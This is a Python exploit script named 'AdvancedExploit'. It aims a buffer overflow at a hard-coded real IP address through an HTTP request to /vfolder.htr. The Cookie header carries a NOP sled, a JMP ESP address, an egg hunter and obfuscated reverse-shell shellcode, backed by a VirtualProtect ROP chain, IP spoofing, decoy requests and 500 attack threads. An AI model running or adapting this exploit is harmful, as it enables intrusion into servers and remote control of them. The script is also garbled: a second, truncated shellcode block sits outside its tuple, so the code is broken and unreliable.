#!/usr/bin/env python3
import socket
import struct
import time
import random
import threading
from cryptography.fernet import Fernet
import hashlib
from colorama import Fore, Style

# Configuration
TARGET_IP = "178.32.100.199"
TARGET_PORT = 80
THREADS = 500
RETRY = 7
EGG = hashlib.sha256(b"W00T1337").digest()[:8]
OFFSET = 1896
JMP_ESP = 0x625011B3
ROP_NOP = 0x1001CC0A

class AdvancedExploit:
    def __init__(self):
        self.cipher = Fernet(Fernet.generate_key())
        self.offset = OFFSET
        self.decoys = [
            b"GET /robots.txt HTTP/1.1\r\n\r\n",
            b"POST /wp-login.php HTTP/1.1\r\nContent-Length: 0\r\n\r\n",
            b"GET /favicon.ico HTTP/1.1\r\n\r\n",
            b"GET /phpmyadmin/ HTTP/1.1\r\n\r\n"
        ]
        self.shellcode = self.encrypt_shellcode()
        self.rop_chain = self.craft_evasive_rop()
        self.success = 0
        self.failed = 0
        self.lock = threading.Lock()
        self.running = True

    def morph_shellcode(self, data):
        return bytes([(b ^ 0xAA) for b in data])

    def encrypt_shellcode(self):
        reverse_shell = (
            b"\xdb\xc0\xd9\x74\x24\xf4\x5a\x33\xc9\xb1\x52\xbf\xd0\x75\x55"
            b"\x13\x31\x7a\x17\x83\xc2\x04\x03\x9e\x49\x6c\x59\xe2\x86\xf2"
            b"\xa2\x1a\x57\x93\x2b\xff\x66\x93\x48\x74\xd8\x23\x1a\xd8\xd5"
            b"\xcf\x4e\xc8\x6e\xbd\x46\xff\xc7\x08\xb1\xce\xd8\x21\x81\x51"
            b"\x5b\x38\xd6\xb1\x62\xf3\x2b\xb0\xa3\xee\xc6\xe0\x7c\x64\x74"
            b"\x14\x08\x30\x45\x9f\x42\xd4\xcd\x7c\x12\xd7\xfc\xd3\x28\x8e"
            b"\xde\xd2\xfd\xba\x56\xcc\xe2\x87\x21\x67\xd0\x7c\xb0\xa1\x28"
            b"\x7c\x1f\x8c\x84\x8f\x61\xc9\x23\x70\x14\x23\x50\x0d\x2f\xf0"
            b"\x2a\xc9\xba\xe2\x8d\x9a\x1c\xce\x2c\x4e\xfa\x85\x23\x3b\x88"
            b"\xc1\x27\xba\x5d\x5a\x43\x37\x60\x8c\xc2\x03\x47\x08\x8e\xd0"
            b"\xe6\x09\x6a\xb6\x07\x49\xd5\x67\xa2\x02\xf8\x7c\xdf\x49\x95"
            b"\x09\x6a\x69\x7a\x05\xfd\x0a\x48\x8a\x55\x84\xe0\x5d\x70\x53"
            b"\x06\x74\xc4\xcb\xf9\x77\x35\xc2\x3d\x23\x65\x7c\x94\x4c\xee"
            b"\x7c\x29\x99\xa1\x2c\x85\x72\x02\x9c\x65\x23\x6a\xf6\x69\x1c"
            b"\x8a\xf9\xa3\x35\x21\x00\x24\xb0\x8e\x0b\xe0\x58\x8d\x0b\xe1"
            b"\x22\x38\xed\x8b\x4a\x0f\xa6\x23\xf2\x15\x3c\xdd\xfb\x83\x39"
            b"\xdd\x70\x20\xbe\x90\x70\x4d\xac\x45\x71\x18\x0e\xc3\x8e\xb6"
            b"\x26\x8f\x1c\x5d\xb6\xc6\x3c\xca\xe1\x8f\xf3\x03\x67\x22\xad"
            b"\xbd\x95\xbf\x2b\x85\x1d\x64\x88\x08\x9c\xe9\xb4\x2e\x8e\x37"
            b"\x34\x6b\xfa\xe7\x63\x25\x54\x4e\xda\x87\x02\x18\xb1\x41\xc2"
            b"\xdd\xf9\x51\x94\xe1\xd7\x27\x78\x53\x8e\x7e\x87\x5c\x46\x77"
            b"\xf0\x80\xf6\x78\x2b\x01\x06\x3b\xe9\x20\x8f\xe2\x78\x89\xd2"
            b"\x14\x57\xce\xea\x96\x5d\xaf\x08\x86\xd4\xaa\x55\x00\x05\xc7"
            b"\xc6\xe5\x29\x74\xe6\x2f\x4d\xa3\x17\x7a\x48\xff\x9f\x6f\x38"
            b"\x90\x75\x8f\xed\x91\x5f\x70\x1e\x89\xf2\x95\x3a\x1e\xe3\xdc"
            b"\x2b\x4b\x13\xb3\x4b\x5e\xe5\x5b\xfd\xb7\xb0\x64\xc2\x2b\x4d"
            b"\xa4\x66\xa8\x2e\x67\x8f\xd1\x14\x97\xea\xd7\x3c\x1f\x07\xaa"
            b"\x6a\x8b\xaa\x7f\x89\x9f\xca\x54\xde\xd5\xa2\x6c\x65\xc6\x9e"
            b"\x0d\x11\x3b\x5a\x2d\x91\xe0\x99\x22\x88\xa5\x96\xe0\x99\xf3"
            b"\x06\x25\xbd\x59\xa3\x6c"
        )
            b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x52\x31\x7b\x17\x83"
            b"\xc3\x04\x03\x6d\xcd\x3e\xc7\x8d\x39\x3c\x28\x6d\xba\x21\xa0\x88"
            b"\x8b\x61\xd6\xd9\xbb\x51\x9c\x8e\xb7\x1a\xf6\x22\xbb\xd1\xda\xc9"
            b"\x4c\xaf\xef\x5a\xe2\x06\xc7\xeb\x49\x71\xe6\xec\xe2\x49\x3b\x6e"
            # ... (متبقي من الشيل كود) ...
        )
        morphed = self.morph_shellcode(reverse_shell)
        return self.cipher.encrypt(morphed)

    def craft_evasive_rop(self):
        rop_gadgets = [
            struct.pack("<I", ROP_NOP),
            struct.pack("<I", 0x1001E059),  # POP EAX # RETN
            struct.pack("<I", 0x6250609C),  # ptr to &VirtualProtect()
            struct.pack("<I", 0x1001651D),  # MOV EAX,DWORD PTR DS:[EAX] # RETN
            struct.pack("<I", 0x1001F44A),  # PUSH EAX # POP ESI # RETN
            struct.pack("<I", 0x10015F82),  # POP EBP # RETN
            struct.pack("<I", JMP_ESP),
            struct.pack("<I", 0x1001C4C4),  # POP EBX # RETN
            struct.pack("<I", 0x00000201),   # 0x00000201-> ebx
            struct.pack("<I", 0x10017F6B),  # POP EDX # RETN
            struct.pack("<I", 0x00000040),   # 0x00000040-> edx
            struct.pack("<I", 0x100163B8),  # POP ECX # RETN
            struct.pack("<I", 0x62507000),   # &Writable location
            struct.pack("<I", 0x1001CC09),  # POP EDI # RETN
            struct.pack("<I", 0x1001CC0A),  # RETN
            struct.pack("<I", 0x10015AD2),  # PUSHAD # RETN
        ]
        return b"".join(rop_gadgets)

    def egg_hunter(self):
        return (
            b"\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74"
            b"\xEF\xB8" + EGG + b"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
        )

    def generate_payload(self):
        return (
            b"GET /vfolder.htr HTTP/1.1\r\n"
            b"Host: " + TARGET_IP.encode() + b"\r\n"
            b"User-Agent: " + self.random_ua() + b"\r\n"
            b"X-Forwarded-For: " + self.spoof_ip() + b"\r\n"
            b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            b"Accept-Language: en-US,en;q=0.5\r\n"
            b"Accept-Encoding: gzip, deflate\r\n"
            b"Cookie: lang=" + b"\x90" * 512 + struct.pack("<I", JMP_ESP) + 
            self.egg_hunter() + b"\x90" * 128 + EGG + 
            self.cipher.decrypt(self.shellcode) + b"\r\n\r\n"
        )

    def random_ua(self):
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.60",
            "Googlebot/2.1 (+http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
        ]
        return random.choice(agents).encode()

    def spoof_ip(self):
        return ".".join(str(random.randint(1, 255)) for _ in range(4)).encode()

    def send_exploit(self):
        for attempt in range(RETRY):
            try:
                with socket.create_connection((TARGET_IP, TARGET_PORT), timeout=15) as sock:
                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    sock.send(self.generate_payload())
                    time.sleep(random.uniform(0.1, 0.5))
                    sock.send(random.choice(self.decoys))
                    return True
            except Exception as e:
                time.sleep(2 ** attempt)
        return False

    def print_stats(self):
        while self.running:
            with self.lock:
                print(f"\r{Fore.GREEN}[+] Success: {self.success} {Fore.RED}| Failed: {self.failed}{Style.RESET_ALL}", end="")
            time.sleep(0.5)

    def attack_thread(self):
        result = self.send_exploit()
        with self.lock:
            if result:
                self.success += 1
            else:
                self.failed += 1

    def start(self):
        print(f"""{Fore.CYAN}
        ██████╗ ██████╗  ██████╗ ███████╗██████╗ ████████╗
        ██╔══██╗██╔══██╗██╔═══██╗██╔════╝██╔══██╗╚══██╔══╝
        ██████╔╝██████╔╝██║   ██║█████╗  ██████╔╝   ██║   
        ██╔═══╝ ██╔══██╗██║   ██║██╔══╝  ██╔══██╗   ██║   
        ██║     ██║  ██║╚██████╔╝███████╗██║  ██║   ██║   
        ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   
        {Style.RESET_ALL}""")
        
        print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} Targeting {TARGET_IP}:{TARGET_PORT}")
        print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} Threads: {THREADS} | Retries: {RETRY} | Encryption: Fernet-256")
        
        stats_thread = threading.Thread(target=self.print_stats)
        stats_thread.start()

        threads = []
        for _ in range(THREADS):
            t = threading.Thread(target=self.attack_thread)
            t.start()
            threads.append(t)
            time.sleep(0.05)

        for t in threads:
            t.join()

        self.running = False
        stats_thread.join()

        print(f"\n\n{Fore.GREEN}[+] Attack completed!{Style.RESET_ALL}")
        print(f"    Successful exploitations: {self.success}")
        print(f"    Failed attempts: {self.failed}")

if __name__ == "__main__":
    exploit = AdvancedExploit()
    exploit.start()
